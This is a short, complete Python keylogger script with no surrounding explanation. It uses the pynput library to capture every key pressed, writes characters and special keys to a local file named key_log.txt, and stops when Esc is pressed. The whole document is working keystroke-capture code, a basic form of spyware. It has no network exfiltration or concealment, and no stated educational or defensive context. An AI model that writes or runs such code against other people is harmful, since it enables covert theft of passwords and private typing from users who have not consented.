from pynput.keyboard import Listener

# Path to save the log file
log_file = "key_log.txt"

# Function to log the keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(str(key.char))  # Log character keys
    except AttributeError:
        with open(log_file, "a") as file:
            # Log special keys (like space, enter, etc.)
            file.write(f"[{str(key)}]")

# Function to stop the listener (optional)
def on_release(key):
    if str(key) == 'Key.esc':  # Press 'Esc' to stop logging
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
